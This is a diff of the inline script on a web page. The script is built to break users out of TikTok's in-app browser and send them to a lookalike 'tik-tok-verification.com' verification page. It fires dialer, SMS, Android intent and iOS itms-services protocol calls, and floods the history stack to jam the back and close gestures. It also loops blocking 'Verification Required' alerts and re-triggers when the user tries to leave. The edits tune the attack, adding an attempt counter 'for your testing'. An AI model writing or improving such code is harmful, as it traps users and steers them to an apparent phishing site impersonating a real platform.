@@ -9,56 +9,54 @@
 
 <script>
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; // ATOMIC FAIL-SAFE
+    const killTime = Date.now() + 5000; 
+    let attemptCount = 14;
 
-    function nuclearBreakout() {
+    function collisionBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // 1. THE SYSTEM SWITCH (The "Exit" Trigger)
-        // We call a protocol the app physically CANNOT render.
-        // This forces the OS to take focus away from TikTok.
-        if (isIOS) {
-            window.location.href = "telprompt://0000000000"; // Triggers iOS system dialer
-        } else {
-            window.location.href = "sms:0000000000?body=exit"; // Triggers Android SMS app
-        }
+        // 1. Trigger an 'untrusted' window opening
+        // This causes the WebView to flag a 'Popup Blocked' or 'Open in Browser' event
+        window.open(destination, '_blank');
 
-        // 2. THE REDIRECT (Fires while the app is losing focus)
-        setTimeout(() => {
-            if (isAndroid) {
-                window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
-            } else {
+        // 2. Immediate Protocol Shotgun
+        if (isAndroid) {
+            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+        } else if (isIOS) {
+            // Using the 'itms-services' protocol which has high OS priority
+            window.location.href = "itms-services://?action=download-manifest&url=" + encodeURIComponent(destination);
+            
+            setTimeout(() => {
                 window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-                // Backup Blob redirect
-                const b = new Blob([`<html><script>window.location.href="${destination}";<\/script></html>`], {type: 'text/html'});
-                window.location.assign(URL.createObjectURL(b));
-            }
-        }, 100);
+            }, 50);
+        }
     }
 
     function rampage() {
-        // FAIL-SAFE: Check actual system clock
+        // FAIL-SAFE: Check system clock
         if (Date.now() > killTime) return;
 
-        nuclearBreakout();
+        collisionBreakout();
 
-        // The Alert locks the UI so the OS has time to process the "Exit" command
-        alert("SECURITY: Verification Required.\n\nTap OK to open in your system browser.");
+        // THE ALERT: Now tracks the attempt number for your testing
+        alert("ATTEMPT #" + attemptCount + "\n\nVerification Required. Tap OK to open System Browser.");
         
-        nuclearBreakout();
+        attemptCount++;
+        collisionBreakout();
 
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Flood the history stack (Jams the X/Swipe-back)
-        for(let i=0; i<60; i++) history.pushState(null, null, "#session_" + i);
+        // Jam the 'X' and back gestures
+        for(let i=0; i<80; i++) history.pushState(null, null, "#ver_" + i);
         rampage();
     };
 
-    // Re-fire if they try to close or blur the window
+    // Re-trigger on any attempt to close the view
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
+    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
 </script>
 </body>
 </html>
